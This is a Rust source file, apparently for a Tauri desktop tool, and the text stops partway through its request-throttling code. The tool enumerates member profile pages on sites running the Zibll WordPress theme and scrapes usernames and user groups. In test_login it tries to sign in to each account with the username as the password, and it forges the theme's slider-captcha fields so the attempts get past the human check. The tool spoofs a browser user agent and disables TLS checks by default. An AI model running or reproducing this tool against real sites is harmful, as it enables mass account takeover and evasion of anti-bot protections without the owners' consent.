use futures_util::{stream, StreamExt};
use reqwest::{Client, Url};
use rusqlite::{params, Connection};
use scraper::{Html, Selector};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::{
    fs,
    path::PathBuf,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    time::{Duration, Instant},
    time::{SystemTime, UNIX_EPOCH},
};
use tauri::{AppHandle, Emitter, Manager, State};

#[derive(Default)]
struct ScannerState {
    stop_requested: Arc<AtomicBool>,
    running: AtomicBool,
}

struct DatabaseState {
    path: PathBuf,
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
struct ScanConfig {
    base_url: String,
    author_path: String,
    start_id: Option<u64>,
    end_id: Option<u64>,
    username_selector: String,
    group_selector: String,
    group_attribute: String,
    member_keyword: String,
    timeout_secs: u64,
    retries: u32,
    concurrency: usize,
    #[serde(default)]
    request_interval_secs: f64,
    verify_tls: bool,
    test_weak_login: bool,
    login_path: String,
    username_field: String,
    password_field: String,
    remember_field: String,
    remember_value: String,
    action_field: String,
    action_value: String,
    failure_json_field: String,
    failure_json_value: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SiteRecord {
    id: i64,
    base_url: String,
    config: ScanConfig,
    created_at: String,
    updated_at: String,
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct MemberResult {
    id: u64,
    url: String,
    status: String,
    username: String,
    group: String,
    login_status: Option<String>,
    message: String,
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct ScanProgress {
    processed: usize,
    total: usize,
    matched: usize,
    result: MemberResult,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ScanSummary {
    processed: usize,
    total: usize,
    matched: usize,
    stopped: bool,
    elapsed_ms: u128,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ScanHistoryRecord {
    id: i64,
    site_id: i64,
    started_at: String,
    finished_at: Option<String>,
    total: usize,
    processed: usize,
    matched: usize,
    stopped: bool,
    elapsed_ms: u128,
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct SelectorPicked {
    field: String,
    selector: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SelectorTestResult {
    url: String,
    count: usize,
    value: String,
}

fn new_site_config(base_url: String) -> ScanConfig {
    ScanConfig {
        base_url,
        author_path: "/author/{id}".into(),
        start_id: None,
        end_id: None,
        username_selector: String::new(),
        group_selector: String::new(),
        group_attribute: String::new(),
        member_keyword: String::new(),
        timeout_secs: 10,
        retries: 2,
        concurrency: 8,
        request_interval_secs: 0.0,
        verify_tls: false,
        test_weak_login: true,
        login_path: "/wp-admin/admin-ajax.php".into(),
        username_field: "username".into(),
        password_field: "password".into(),
        remember_field: "remember".into(),
        remember_value: "forever".into(),
        action_field: "action".into(),
        action_value: "user_signin".into(),
        failure_json_field: "error".into(),
        failure_json_value: "1".into(),
    }
}

fn open_database(state: &DatabaseState) -> Result<Connection, String> {
    let connection =
        Connection::open(&state.path).map_err(|error| format!("数据库连接失败：{error}"))?;
    connection
        .execute_batch("PRAGMA foreign_keys = ON;")
        .map_err(|error| format!("数据库配置失败：{error}"))?;
    Ok(connection)
}

fn init_database(path: &PathBuf) -> Result<(), String> {
    let connection = Connection::open(path).map_err(|error| format!("数据库创建失败：{error}"))?;
    connection
        .execute_batch(
            "PRAGMA foreign_keys = ON;
            CREATE TABLE IF NOT EXISTS sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                base_url TEXT NOT NULL UNIQUE COLLATE NOCASE,
                config_json TEXT NOT NULL,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS scan_runs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                site_id INTEGER NOT NULL,
                config_json TEXT NOT NULL,
                started_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                finished_at TEXT,
                total INTEGER NOT NULL DEFAULT 0,
                processed INTEGER NOT NULL DEFAULT 0,
                matched INTEGER NOT NULL DEFAULT 0,
                stopped INTEGER NOT NULL DEFAULT 0,
                elapsed_ms INTEGER NOT NULL DEFAULT 0,
                FOREIGN KEY (site_id) REFERENCES sites(id) ON DELETE CASCADE
            );
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                run_id INTEGER NOT NULL,
                member_id INTEGER NOT NULL,
                url TEXT NOT NULL,
                username TEXT NOT NULL,
                user_group TEXT NOT NULL,
                login_status TEXT,
                message TEXT NOT NULL,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (run_id) REFERENCES scan_runs(id) ON DELETE CASCADE
            );",
        )
        .map_err(|error| format!("数据库初始化失败：{error}"))?;

    Ok(())
}

fn row_to_site(
    id: i64,
    base_url: String,
    config_json: String,
    created_at: String,
    updated_at: String,
) -> Result<SiteRecord, String> {
    let mut config: ScanConfig =
        serde_json::from_str(&config_json).map_err(|error| format!("站点配置解析失败：{error}"))?;
    config.base_url = base_url.clone();
    Ok(SiteRecord {
        id,
        base_url,
        config,
        created_at,
        updated_at,
    })
}

#[tauri::command]
fn list_sites(state: State<'_, DatabaseState>) -> Result<Vec<SiteRecord>, String> {
    let connection = open_database(&state)?;
    let mut statement = connection
        .prepare(
            "SELECT id, base_url, config_json, created_at, updated_at
             FROM sites ORDER BY updated_at DESC, id DESC",
        )
        .map_err(|error| format!("站点列表读取失败：{error}"))?;
    let rows = statement
        .query_map([], |row| {
            Ok((
                row.get::<_, i64>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, String>(4)?,
            ))
        })
        .map_err(|error| format!("站点列表读取失败：{error}"))?;

    let mut sites = Vec::new();
    for row in rows {
        let (id, base_url, config_json, created_at, updated_at) =
            row.map_err(|error| format!("站点记录读取失败：{error}"))?;
        sites.push(row_to_site(
            id,
            base_url,
            config_json,
            created_at,
            updated_at,
        )?);
    }
    Ok(sites)
}

#[tauri::command]
fn create_site(state: State<'_, DatabaseState>, base_url: String) -> Result<SiteRecord, String> {
    let normalized = normalize_base_url(&base_url)?;
    let base_url = normalized.as_str().trim_end_matches('/').to_string();
    let config = new_site_config(base_url.clone());
    let config_json =
        serde_json::to_string(&config).map_err(|error| format!("站点配置序列化失败：{error}"))?;
    let connection = open_database(&state)?;
    connection
        .execute(
            "INSERT INTO sites (base_url, config_json) VALUES (?1, ?2)",
            params![base_url, config_json],
        )
        .map_err(|error| {
            if error.to_string().contains("UNIQUE constraint failed") {
                "该站点已经存在".to_string()
            } else {
                format!("站点创建失败：{error}")
            }
        })?;
    let id = connection.last_insert_rowid();
    let mut statement = connection
        .prepare(
            "SELECT id, base_url, config_json, created_at, updated_at FROM sites WHERE id = ?1",
        )
        .map_err(|error| format!("站点读取失败：{error}"))?;
    let row = statement
        .query_row([id], |row| {
            Ok((
                row.get::<_, i64>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, String>(4)?,
            ))
        })
        .map_err(|error| format!("站点读取失败：{error}"))?;
    row_to_site(row.0, row.1, row.2, row.3, row.4)
}

#[tauri::command]
fn update_site(
    state: State<'_, DatabaseState>,
    id: i64,
    mut config: ScanConfig,
) -> Result<(), String> {
    let normalized = normalize_base_url(&config.base_url)?;
    config.base_url = normalized.as_str().trim_end_matches('/').to_string();
    let config_json =
        serde_json::to_string(&config).map_err(|error| format!("站点配置序列化失败：{error}"))?;
    let connection = open_database(&state)?;
    let changed = connection
        .execute(
            "UPDATE sites
             SET base_url = ?1, config_json = ?2, updated_at = CURRENT_TIMESTAMP
             WHERE id = ?3",
            params![config.base_url, config_json, id],
        )
        .map_err(|error| format!("站点保存失败：{error}"))?;
    if changed == 0 {
        return Err("站点不存在或已被删除".into());
    }
    Ok(())
}

#[tauri::command]
fn delete_site(state: State<'_, DatabaseState>, id: i64) -> Result<(), String> {
    let connection = open_database(&state)?;
    connection
        .execute("DELETE FROM sites WHERE id = ?1", [id])
        .map_err(|error| format!("站点删除失败：{error}"))?;
    Ok(())
}

#[tauri::command]
fn list_scan_history(
    state: State<'_, DatabaseState>,
    site_id: i64,
) -> Result<Vec<ScanHistoryRecord>, String> {
    let connection = open_database(&state)?;
    let mut statement = connection
        .prepare(
            "SELECT id, site_id, started_at, finished_at, total, processed, matched, stopped, elapsed_ms
             FROM scan_runs WHERE site_id = ?1 ORDER BY id DESC",
        )
        .map_err(|error| format!("历史记录读取失败：{error}"))?;
    let rows = statement
        .query_map([site_id], |row| {
            Ok(ScanHistoryRecord {
                id: row.get(0)?,
                site_id: row.get(1)?,
                started_at: row.get(2)?,
                finished_at: row.get(3)?,
                total: row.get(4)?,
                processed: row.get(5)?,
                matched: row.get(6)?,
                stopped: row.get::<_, i64>(7)? != 0,
                elapsed_ms: row.get::<_, i64>(8)? as u128,
            })
        })
        .map_err(|error| format!("历史记录读取失败：{error}"))?;
    rows.collect::<Result<Vec<_>, _>>()
        .map_err(|error| format!("历史记录读取失败：{error}"))
}

#[tauri::command]
fn get_scan_results(
    state: State<'_, DatabaseState>,
    run_id: i64,
) -> Result<Vec<MemberResult>, String> {
    let connection = open_database(&state)?;
    let mut statement = connection
        .prepare(
            "SELECT member_id, url, username, user_group, login_status, message
             FROM scan_results WHERE run_id = ?1 ORDER BY member_id ASC",
        )
        .map_err(|error| format!("历史结果读取失败：{error}"))?;
    let rows = statement
        .query_map([run_id], |row| {
            Ok(MemberResult {
                id: row.get(0)?,
                url: row.get(1)?,
                status: "matched".into(),
                username: row.get(2)?,
                group: row.get(3)?,
                login_status: row.get(4)?,
                message: row.get(5)?,
            })
        })
        .map_err(|error| format!("历史结果读取失败：{error}"))?;
    rows.collect::<Result<Vec<_>, _>>()
        .map_err(|error| format!("历史结果读取失败：{error}"))
}

#[tauri::command]
fn delete_scan_history(state: State<'_, DatabaseState>, run_id: i64) -> Result<(), String> {
    let connection = open_database(&state)?;
    connection
        .execute("DELETE FROM scan_runs WHERE id = ?1", [run_id])
        .map_err(|error| format!("历史记录删除失败：{error}"))?;
    Ok(())
}

fn create_scan_run(
    state: &DatabaseState,
    site_id: i64,
    config: &ScanConfig,
    total: usize,
) -> Result<i64, String> {
    let connection = open_database(state)?;
    let config_json =
        serde_json::to_string(config).map_err(|error| format!("扫描配置序列化失败：{error}"))?;
    connection
        .execute(
            "INSERT INTO scan_runs (site_id, config_json, total) VALUES (?1, ?2, ?3)",
            params![site_id, config_json, total],
        )
        .map_err(|error| format!("扫描记录创建失败：{error}"))?;
    Ok(connection.last_insert_rowid())
}

fn save_scan_result(
    state: &DatabaseState,
    run_id: i64,
    result: &MemberResult,
) -> Result<(), String> {
    let connection = open_database(state)?;
    connection
        .execute(
            "INSERT INTO scan_results
             (run_id, member_id, url, username, user_group, login_status, message)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![
                run_id,
                result.id,
                result.url.as_str(),
                result.username.as_str(),
                result.group.as_str(),
                result.login_status.as_deref(),
                result.message.as_str()
            ],
        )
        .map_err(|error| format!("命中结果保存失败：{error}"))?;
    Ok(())
}

fn finish_scan_run(
    state: &DatabaseState,
    run_id: i64,
    summary: &ScanSummary,
) -> Result<(), String> {
    let connection = open_database(state)?;
    connection
        .execute(
            "UPDATE scan_runs SET finished_at = CURRENT_TIMESTAMP, processed = ?1,
             matched = ?2, stopped = ?3, elapsed_ms = ?4 WHERE id = ?5",
            params![
                summary.processed,
                summary.matched,
                summary.stopped,
                summary.elapsed_ms.min(i64::MAX as u128) as i64,
                run_id
            ],
        )
        .map_err(|error| format!("扫描记录更新失败：{error}"))?;
    Ok(())
}

fn normalize_base_url(value: &str) -> Result<Url, String> {
    let trimmed = value.trim().trim_end_matches('/');
    if trimmed.is_empty() {
        return Err("域名不能为空".into());
    }
    let value = if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        trimmed.to_string()
    } else {
        format!("https://{trimmed}")
    };
    Url::parse(&format!("{value}/")).map_err(|error| format!("域名格式错误：{error}"))
}

fn endpoint_url(base: &Url, path: &str) -> Result<Url, String> {
    if path.starts_with("http://") || path.starts_with("https://") {
        Url::parse(path).map_err(|error| format!("接口地址格式错误：{error}"))
    } else {
        base.join(path.trim_start_matches('/'))
            .map_err(|error| format!("接口地址格式错误：{error}"))
    }
}

fn author_url(base: &Url, path: &str, id: u64) -> Result<Url, String> {
    let path = if path.contains("{id}") {
        path.replace("{id}", &id.to_string())
    } else {
        format!("{}/{}", path.trim_end_matches('/'), id)
    };
    endpoint_url(base, &path)
}

fn sanitize_selector(selector: &str) -> String {
    selector
        .replace(".lazyloadafter", "")
        .replace(".ls-is-cached", "")
        .replace(".lazyloaded", "")
        .replace(".lazyload", "")
        .replace(".is-loaded", "")
}

#[tauri::command]
fn open_selector_picker(
    app: AppHandle,
    base_url: String,
    author_path: String,
    sample_id: u64,
    field: String,
) -> Result<(), String> {
    if field != "usernameSelector" && field != "groupSelector" {
        return Err("不支持的 Selector 字段".into());
    }
    let base = normalize_base_url(&base_url)?;
    let url = author_url(&base, &author_path, sample_id)?;
    if let Some(existing) = app.get_webview_window("selector-picker") {
        let _ = existing.close();
    }

    let script = r#"
      (() => {
        const startPicker = () => {
          if (window.__zibllSelectorPicker) return;
          window.__zibllSelectorPicker = true;
          const style = document.createElement('style');
          style.textContent = `
            .zibll-selector-hover {
              outline: 2px solid #1677ff !important;
              outline-offset: 2px !important;
              cursor: crosshair !important;
            }
            #zibll-selector-tip {
              position: fixed !important;
              top: 12px !important;
              left: 50% !important;
              transform: translateX(-50%) !important;
              z-index: 2147483647 !important;
              padding: 10px 16px !important;
              border-radius: 6px !important;
              color: white !important;
              background: rgba(0, 0, 0, .82) !important;
              font: 14px -apple-system, BlinkMacSystemFont, sans-serif !important;
              pointer-events: none !important;
              box-shadow: 0 4px 16px rgba(0,0,0,.25) !important;
            }
          `;
          document.documentElement.appendChild(style);
          const tip = document.createElement('div');
          tip.id = 'zibll-selector-tip';
          tip.textContent = '移动鼠标预览并单击选择；Hover 内容会消失时，显示后按 F 键冻结页面';
          document.documentElement.appendChild(tip);

          const escapeName = (value) => window.CSS?.escape
            ? CSS.escape(value)
            : value.replace(/[^a-zA-Z0-9_-]/g, (char) => `\\${char}`);
          const unique = (selector) => {
            try { return document.querySelectorAll(selector).length === 1; }
            catch (_) { return false; }
          };
          const selectorFor = (element) => {
            if (!(element instanceof Element)) return '';
            if (element.id) {
              const byId = `#${escapeName(element.id)}`;
              if (unique(byId)) return byId;
            }
            const parts = [];
            let current = element;
            while (current && current.nodeType === 1 && current !== document.documentElement) {
              let part = current.tagName.toLowerCase();
              const classes = Array.from(current.classList)
                .filter((name) => {
                  if (!name || name === 'zibll-selector-hover') return false;
                  const lower = name.toLowerCase();
                  return !lower.startsWith('ls-')
                    && !lower.includes('lazyload')
                    && !['loaded', 'is-loaded', 'active', 'hover', 'focus'].includes(lower);
                })
                .slice(0, 3);
              if (classes.length) part += classes.map((name) => `.${escapeName(name)}`).join('');
              const parent = current.parentElement;
              if (parent) {
                const sameTag = Array.from(parent.children).filter(
                  (child) => child.tagName === current.tagName
                );
                if (sameTag.length > 1 && !unique(part)) {
                  part += `:nth-of-type(${sameTag.indexOf(current) + 1})`;
                }
              }
              parts.unshift(part);
              const candidate = parts.join(' > ');
              if (unique(candidate)) return candidate;
              current = parent;
            }
            return parts.join(' > ');
          };

          let hovered = null;
          let frozen = false;
          let pointerMoved = false;
          const armedAt = Date.now() + 800;

          const freezePage = () => {
            if (frozen || !document.body) return;
            hovered?.classList?.remove('zibll-selector-hover');
            const sourceBody = document.body;
            const frozenBody = sourceBody.cloneNode(true);
            const sourceElements = [sourceBody, ...sourceBody.querySelectorAll('*')];
            const frozenElements = [frozenBody, ...frozenBody.querySelectorAll('*')];
            for (let index = 0; index < sourceElements.length; index += 1) {
              const source = sourceElements[index];
              const target = frozenElements[index];
              if (!(source instanceof Element) || !(target instanceof Element)) continue;
              const computed = getComputedStyle(source);
              let cssText = '';
              for (const property of computed) {
                cssText += `${property}:${computed.getPropertyValue(property)};`;
              }
              target.style.cssText = cssText;
            }
            sourceBody.replaceWith(frozenBody);
            frozen = true;
            hovered = null;
            tip.textContent = '页面 Hover 状态已冻结，现在可以移动鼠标并点击目标元素';
          };

          document.addEventListener('keydown', (event) => {
            if (event.isTrusted && event.key.toLowerCase() === 'f' && !event.metaKey && !event.ctrlKey) {
              event.preventDefault();
              event.stopImmediatePropagation();
              freezePage();
            }
          }, true);
          document.addEventListener('mousemove', (event) => {
            if (event.isTrusted) pointerMoved = true;
          }, true);
          document.addEventListener('mouseover', (event) => {
            if (!event.isTrusted || event.target === tip || event.target === style) return;
            hovered?.classList?.remove('zibll-selector-hover');
            hovered = event.target;
            hovered?.classList?.add('zibll-selector-hover');
          }, true);
          document.addEventListener('click', (event) => {
            if (!event.isTrusted || !(event.target instanceof Element) || event.target === tip) return;
            event.preventDefault();
            event.stopImmediatePropagation();
            if (!pointerMoved || Date.now() < armedAt || hovered !== event.target) {
              tip.textContent = '请先移动鼠标高亮目标元素，再单击进行选择';
              return;
            }
            const selector = selectorFor(event.target);
            if (selector) {
              window.location.href = `zibll-selector://picked?selector=${encodeURIComponent(selector)}`;
            }
          }, true);
        };
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', startPicker, { once: true });
        } else {
          startPicker();
        }
      })();
    "#;

    let navigation_app = app.clone();
    let navigation_field = field.clone();
    tauri::WebviewWindowBuilder::new(&app, "selector-picker", tauri::WebviewUrl::External(url))
        .title("选择页面元素")
        .inner_size(1100.0, 780.0)
        .initialization_script(script)
        .on_navigation(move |url| {
            if url.scheme() == "zibll-selector" {
                if let Some(selector) = url
                    .query_pairs()
                    .find(|(key, _)| key == "selector")
                    .map(|(_, value)| value.into_owned())
                {
                    let _ = navigation_app.emit(
                        "selector-picked",
                        SelectorPicked {
                            field: navigation_field.clone(),
                            selector,
                        },
                    );
                    if let Some(window) = navigation_app.get_webview_window("selector-picker") {
                        let _ = window.close();
                    }
                }
                false
            } else {
                true
            }
        })
        .build()
        .map_err(|error| format!("页面选择器窗口打开失败：{error}"))?;
    Ok(())
}

async fn request_text(client: &Client, url: Url, retries: u32) -> Result<(u16, String), String> {
    let mut last_error = String::new();
    for attempt in 0..=retries {
        match client.get(url.clone()).send().await {
            Ok(response) => {
                let status = response.status().as_u16();
                match response.text().await {
                    Ok(text) => return Ok((status, text)),
                    Err(error) => last_error = error.to_string(),
                }
            }
            Err(error) => last_error = error.to_string(),
        }
        if attempt < retries {
            tokio::time::sleep(Duration::from_millis(250 * 2u64.pow(attempt.min(4)))).await;
        }
    }
    Err(last_error)
}

#[tauri::command]
async fn test_selector(config: ScanConfig, field: String) -> Result<SelectorTestResult, String> {
    let sample_id = config
        .start_id
        .ok_or("请先填写起始 ID，测试时会将它作为示例会员 ID")?;
    let base = normalize_base_url(&config.base_url)?;
    let url = author_url(&base, &config.author_path, sample_id)?;
    let (selector_text, attribute) = match field.as_str() {
        "usernameSelector" => (config.username_selector.as_str(), None),
        "groupSelector" => (
            config.group_selector.as_str(),
            (!config.group_attribute.trim().is_empty()).then_some(config.group_attribute.as_str()),
        ),
        _ => return Err("不支持的 Selector 字段".into()),
    };
    if selector_text.trim().is_empty() {
        return Err("请先填写 CSS Selector".into());
    }
    let selector_text = sanitize_selector(selector_text);
    let selector =
        Selector::parse(&selector_text).map_err(|error| format!("CSS Selector 无效：{error:?}"))?;
    let client = Client::builder()
        .timeout(Duration::from_secs(config.timeout_secs.clamp(1, 300)))
        .danger_accept_invalid_certs(!config.verify_tls)
        .user_agent("Zibll-Member-Audit/0.1")
        .build()
        .map_err(|error| format!("HTTP 客户端创建失败：{error}"))?;
    let url_text = url.to_string();
    let (status, body) = request_text(&client, url, config.retries).await?;
    if !(200..400).contains(&status) {
        return Err(format!("页面请求失败：HTTP {status}"));
    }
    let document = Html::parse_document(&body);
    let elements = document.select(&selector).collect::<Vec<_>>();
    let count = elements.len();
    let value = if let Some(attribute) = attribute {
        elements
            .iter()
            .find_map(|element| {
                element
                    .value()
                    .attr(attribute)
                    .map(str::trim)
                    .filter(|value| !value.is_empty())
                    .map(str::to_string)
            })
            .unwrap_or_default()
    } else {
        elements
            .first()
            .map(|element| {
                element
                    .text()
                    .collect::<Vec<_>>()
                    .join(" ")
                    .split_whitespace()
                    .collect::<Vec<_>>()
                    .join(" ")
            })
            .unwrap_or_default()
    };
    Ok(SelectorTestResult {
        url: url_text,
        count,
        value,
    })
}

async fn test_login(base: &Url, config: &ScanConfig, username: &str) -> (String, String) {
    fn rnd(min: u64, max: u64) -> u64 {
        let n = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        min + (n % (max - min + 1))
    }
    fn letters(n: u64) -> String {
        (0..n)
            .map(|i| (b'a' + ((i * 37 + 11) % 26) as u8) as char)
            .collect()
    }
    fn obf(value: &str) -> String {
        let e = rnd(11, 40);
        let i = rnd(11, 40);
        format!("{}{}{}{}{}", e, letters(e), value, letters(i), i)
    }
    let client = match Client::builder()
        .timeout(Duration::from_secs(config.timeout_secs.clamp(1, 300)))
        .danger_accept_invalid_certs(!config.verify_tls)
        .cookie_store(true)
        .user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36")
        .build()
    {
        Ok(client) => client,
        Err(error) => return ("error".into(), format!("登录会话创建失败：{error}")),
    };
    let signin_page = match endpoint_url(base, "/user-sign?tab=signin") {
        Ok(url) => url,
        Err(error) => return ("error".into(), error),
    };
    let signin_referrer = signin_page.to_string();
    let signin_res = match client.get(signin_page).send().await {
        Ok(res) => res,
        Err(error) => return ("error".into(), format!("登录页会话初始化失败：{error}")),
    };
    if signin_res.status().as_u16() == 429 {
        return (
            "error".into(),
            "登录页会话初始化被限流：HTTP 429（请求过于频繁，建议增大请求间隔）".into(),
        );
    }
    let login_url = match endpoint_url(base, &config.login_path) {
        Ok(url) => url,
        Err(error) => return ("error".into(), error),
    };
    let mut form = vec![
        (config.username_field.clone(), username.to_string()),
        (config.password_field.clone(), username.to_string()),
    ];
    if !config.remember_field.trim().is_empty() {
        form.push((config.remember_field.clone(), config.remember_value.clone()));
    }
    if !config.action_field.trim().is_empty() {
        form.push((config.action_field.clone(), config.action_value.clone()));
    }

    // Zibll slider captcha handshake: fetch challenge, then submit derived fields.
    if config.login_path.contains("admin-ajax.php") && config.action_value == "user_signin" {
        let distance = rnd(60, 200).to_string();
        let captcha_randstr = obf(&distance);
        let captcha_url = match endpoint_url(base, "/wp-content/themes/zibll/action/captcha.php") {
            Ok(url) => url,
            Err(error) => return ("error".into(), format!("验证码接口地址错误：{error}")),
        };
        let captcha_response = match client
            .get(captcha_url)
            .query(&[("type", "slider"), ("randstr", captcha_randstr.as_str())])
            .header(reqwest::header::REFERER, signin_referrer.as_str())
            .header("X-Requested-With", "XMLHttpRequest")
            .header(reqwest::header::ACCEPT, "application/json")
            .send()
            .await
        {
            Ok(response) => response,
            Err(error) => return ("error".into(), format!("验证码挑战请求失败：{error}")),
        };
        let captcha_status = captcha_response.status();
        if captcha_status.as_u16() == 429 {
            return (
                "error".into(),
                "验证码挑战被限流：HTTP 429（请求过于频繁，建议增大请求间隔）".into(),
            );
        }
        if !captcha_status.is_success() {
            return (
                "error".into(),
                format!(
                    "验证码挑战请求失败：HTTP {}",
                    captcha_status.as_u16()
                ),
            );
        }
        let captcha_json = match captcha_response.json::<Value>().await {
            Ok(value) => value,
            Err(error) => {
                return (
                    "error".into(),
                    format!("验证码挑战响应不是有效 JSON：{error}"),
                )
            }
        };
        let rand_str = match captcha_json.get("rand_str").and_then(Value::as_str) {
            Some(value) if !value.is_empty() => value,
            _ => return ("error".into(), "验证码挑战响应缺少 rand_str".into()),
        };
        let check = match captcha_json.get("check") {
            Some(Value::String(value)) => value.clone(),
            Some(value) => value.to_string(),
            None => return ("error".into(), "验证码挑战响应缺少 check".into()),
        };
        let o = rnd(1, 9) as usize;
        let rr = rnd(15, 25) as usize;
        let start = o.min(rand_str.len());
        let end = rr.min(rand_str.len()).max(start);
        form.push(("captcha[check]".into(), check));
        form.push(("captcha[ticket]".into(), obf(&distance)));
        form.push((
            "captcha[randstr]".into(),
            format!("{}{}{}", o, &rand_str[start..end], rr),
        ));
        form.push(("captcha[spliced]".into(), "true".into()));
        form.push(("captcha[trail]".into(), "[]".into()));
    }

    match client
        .post(login_url)
        .header(reqwest::header::REFERER, signin_referrer.as_str())
        .header("X-Requested-With", "XMLHttpRequest")
        .form(&form)
        .send()
        .await
    {
        Ok(response) => {
            let status = response.status();
            let content_type = response
                .headers()
                .get(reqwest::header::CONTENT_TYPE)
                .and_then(|value| value.to_str().ok())
                .unwrap_or("未知")
                .to_string();
            let response_url = response.url().to_string();
            let body = match response.text().await {
                Ok(body) => body,
                Err(error) => {
                    return (
                        "error".into(),
                        format!(
                            "登录响应读取失败：{error}\nHTTP 状态：{}\n响应地址：{response_url}\nContent-Type：{content_type}",
                            status.as_u16()
                        ),
                    )
                }
            };

            // 反序列化 JSON 并格式化为 UTF-8 中文字符，避免 Unicode 转义 (\uXXXX) 影响阅读
            let (parsed_json, display_body) = match serde_json::from_str::<Value>(&body) {
                Ok(val) => {
                    let formatted = serde_json::to_string_pretty(&val).unwrap_or_else(|_| body.clone());
                    (Some(val), formatted)
                }
                Err(_) => {
                    let preview = body.chars().take(1500).collect::<String>();
                    (
                        None,
                        if preview.trim().is_empty() {
                            "（空响应）".to_string()
                        } else {
                            preview.trim().to_string()
                        },
                    )
                }
            };

            let response_detail = format!(
                "HTTP 状态：{}\n响应地址：{response_url}\nContent-Type：{content_type}\n响应内容：\n{display_body}",
                status.as_u16()
            );

            // 1. 优先检测 HTTP 429 频次限制
            if status.as_u16() == 429 {
                let msg = parsed_json
                    .as_ref()
                    .and_then(|v| v.get("msg").and_then(Value::as_str))
                    .unwrap_or("操作过于频繁，请稍后再试");
                return (
                    "error".into(),
                    format!("接口限流拦截（HTTP 429）：{msg}\n{response_detail}"),
                );
            }

            // 2. 检测其他非 2xx HTTP 状态码（如 403 / 500 / 502 / 503 等）
            if !status.is_success() {
                let msg = parsed_json
                    .as_ref()
                    .and_then(|v| v.get("msg").and_then(Value::as_str));
                let summary = match msg {
                    Some(m) if !m.is_empty() => {
                        format!("接口请求异常（HTTP {}）：{m}", status.as_u16())
                    }
                    _ => format!("接口请求异常：HTTP {}", status.as_u16()),
                };
                return ("error".into(), format!("{summary}\n{response_detail}"));
            }

            // 3. 检查是否为有效 JSON 响应
            let value = match parsed_json {
                Some(v) => v,
                None => {
                    return (
                        "error".into(),
                        format!("登录响应不是有效 JSON\n{response_detail}"),
                    );
                }
            };

            let message_text = value.get("msg").and_then(Value::as_str).unwrap_or_default();

            // 4. 检查是否为人机验证 / 验证码挑战失败
            if message_text.contains("人机验证")
                || message_text.contains("验证码")
                || body.contains("人机验证")
            {
                let err_msg = if message_text.is_empty() {
                    "人机验证未通过"
                } else {
                    message_text
                };
                return (
                    "error".into(),
                    format!("验证码校验失败：{err_msg}\n{response_detail}"),
                );
            }

            // 5. 检查是否包含频次限制 / 拦截关键字（即使服务端返回 HTTP 200）
            if message_text.contains("频繁")
                || message_text.contains("稍后再试")
                || message_text.contains("请求过多")
                || message_text.contains("限流")
                || message_text.contains("访问受限")
                || (message_text.contains("限制") && message_text.contains("操作"))
            {
                return (
                    "error".into(),
                    format!("接口限流拦截：{message_text}\n{response_detail}"),
                );
            }

            // 6. 正常登录业务结果判定
            let actual = value
                .get(&config.failure_json_field)
                .map(|item| match item {
                    Value::String(text) => text.clone(),
                    other => other.to_string(),
                });

            if actual.as_deref() == Some(config.failure_json_value.as_str()) {
                let fail_summary = if !message_text.is_empty() {
                    format!("弱口令登录失败：{message_text}")
                } else {
                    "弱口令登录失败（用户名作为密码未通过）".to_string()
                };
                (
                    "failed".into(),
                    format!("{fail_summary}\n{response_detail}"),
                )
            } else {
                let success_summary = if !message_text.is_empty() {
                    format!("弱口令登录成功：{message_text}")
                } else {
                    "弱口令登录成功（用户名作为密码验证通过）".to_string()
                };
                (
                    "vulnerable".into(),
                    format!("{success_summary}\n{response_detail}"),
                )
            }
        }
        Err(error) => ("error".into(), format!("登录请求失败：{error}")),
    }
}

struct RequestThrottler {
    interval: Duration,
    state: tokio::sync::Mutex<ThrottlerState>,
}

struct ThrottlerState {
    last_start: Option<Instant>,
    last_finish: Option<Instant>,
}

impl RequestThrottler {
    fn new(interval_secs: f64) -> Self {
        let secs = if interval_secs.is_finite() && interval_secs > 0.0 {
            interval_secs
        } else {
            0.0
        };
        Self {
            interval: Duration::from_secs_f64(secs),
            state: tokio::sync::Mutex::new(ThrottlerState {
                last_start: None,
                last_finish: None,
            }),
        }
    }

    async fn wait(&self, stop: &AtomicBool) {
        if self.interval.is_zero() || stop.load(Ordering::SeqCst) {
            return;
        }

        let mut state = self.state.lock().await;
        if stop.load(Ordering::SeqCst) {
            return;
        }

        let now = Instant::now();
        let delay_from_start = state
            .last_start
            .map(|t| self.interval.saturating_sub(now.saturating_duration_since(t)))
            .unwrap_or(Duration::ZERO);
        let delay_from_finish = state
            .last_finish
            .map(|t| self.interval.saturating_sub(now.saturating_duration_since(t)))
            .unwrap_or(Duration::ZERO);

        let to_sleep = delay_from_start.max(delay_from_finish);
        if to_sleep > Duration::ZERO {
            let step = Duration::from_millis(100);
            let mut remaining = to_sleep;
